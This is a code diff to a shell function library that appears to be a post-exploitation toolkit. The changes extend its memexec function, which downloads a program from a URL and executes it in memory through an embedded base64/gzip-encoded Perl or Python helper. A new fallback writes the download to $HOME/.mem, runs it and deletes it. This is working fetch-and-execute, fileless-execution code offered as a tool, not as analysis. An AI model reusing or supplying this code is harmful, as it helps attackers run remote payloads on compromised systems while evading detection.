@@ -21,7 +21,10 @@ orc_existsProg () {
     echo 'Error: missing program name to check' >&2
     return 1;
   fi
-  hash "$@" > /dev/null 2> /dev/null
+  # The hash tool works on bash, dash, ash but on ksh
+  # the type tool is needed. On ksh "hash xyz" returns
+  # 0 also if the program xyz does not exists.
+  type "$@" > /dev/null 2> /dev/null
   }
 
 
@@ -408,6 +411,42 @@ orc_ourpts() {
 }
 
 
+orc_isMinimalOsVersion() {
+  # Checks the OS name and version.
+  # Arguments: OS name (e.g. Linux)
+  #            First part of the version number
+  #            Secoend part of the version numer
+  # Return: 0 if OS name is equal and version is equal or greater.
+  #         1 if OS name is not equal
+  #         2 if OS name is equal but version is less.
+  local first rest
+  if [ $# -ne 3 ]; then
+    echo "Error: missing arguments: name, version1, version2" >&2
+    return 9
+  fi
+  # use the short options -s and -n because not all uname tools
+  # support the long option names, e.g. busybox.
+  if [ "$1" != "$(uname -s)" ]; then
+    return 1
+  fi
+  rest=$(uname -r)
+  first=${rest%%.*}
+  if [ "$first" -gt "$2" ]; then
+    return 0;
+  elif [ "$first" -lt "$2" ]; then
+    return 2;
+  fi
+  # first part of the version number is equal
+  rest=${rest#*.}
+  first=${rest%%.*}
+  if [ "$first" -lt "$3" ]; then
+    return 2
+  fi
+  # second part of the version number is greater or equal
+  return 0
+}
+
+
 # ~~~ User Functions ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 #
 # The user functions are designed to be called by the o.rc users.
@@ -616,8 +655,14 @@ qsu() {
 
 memexec() {
   # Execute a binary program or a script file in-memory from webserver.
+  # Stores the downloaded file in an anonymous file in the
+  # /proc/self process memory.
+  # If this is not possible the file is stored in the $HOME
+  # directory of orc, which is typical a tmpfs.
   # Argument: URL of the binary, http or https is supported.
   #           other arguments are passed thru to the program/script
+  # Global:   http_proxy and https_proxy variables could be used
+  #           to defined a proxy for the download.
   local url interpreter
   if [ $# -lt 1 ]; then
     echo 'Error: memexec needs URL as argument' >&2
@@ -626,24 +671,38 @@ memexec() {
   # first argument is the URL to load
   url="$1"
   shift
-  if ! orc_existsProg base64 || ! orc_existsProg gzip; then
-    echo 'Error: need base64 and gzip to decode the script' >&2
-    return 1
-  fi
-  if orc_existsProg python3; then
+  if ! orc_existsProg base64; then
+    echo 'Warning: need base64, go into fallback mode' >&2
+    interpreter='fallback'
+  elif ! orc_existsProg gzip; then
+    echo 'Warning: need gzip, go inti fallback mode' >&2
+    interpreter='fallback'
+  elif ! orc_isMinimalOsVersion Linux 3 17; then
+    echo 'Warning: need Linux >= 3.17, go in fallback mode' >&2
+    interpreter='fallback'
+  elif orc_existsProg python3; then
     interpreter='python3'
   elif orc_existsProg python2; then
     interpreter='python2'
   elif orc_existsProg python; then
+    # Python version 2 interpreter is often named simply "python"
     interpreter='python'
   elif orc_existsProg perl; then
     interpreter='perl'
   else
-    echo 'Error: need perl or python, can not execute in memory' >&2
-    return 1
+    echo 'Warinng: need perl or python, go in fallback mode' >&2
+    interpreter='fallback'
   fi
   orc_exportProxySettings
-  if [ "$interpreter" = "perl" ]; then
+  if [ "$interpreter" = 'fallback' ]; then
+    # Can not load the program/script into anonymous file.
+    # As fallback load the file into the orc $HOME, this
+    # should be a tmpfs.
+    orc_loadURL "$url" > "$HOME/.mem"
+    chmod +x "$HOME/.mem"
+    "$HOME/.mem" "$@"
+    rm "$HOME/.mem"
+  elif [ "$interpreter" = 'perl' ]; then
     # decode the Perl script and run the script
     ( base64 -d |
       gzip -d |
@@ -661,6 +720,7 @@ KH6ZVOKBCYx6frEtzq5572VslPBIA5VINALhgkPBSkPpduxQrLgrGq+ByUEH3e6gyAdGqbWmbg5/
 sc3jwF7YfAqNFRxD5E/hGaJ+/zlwAh8/3X/5/vca4x4pHF337JejBQXn4DckTWOa3wQAAA==
 ====end
   else
+    # else must be: "$interpeter" = 'pythonX'
     # decode the Python script and run the script
     # The Python scrips runs with Python version 3 and 2
     ( base64 -d |
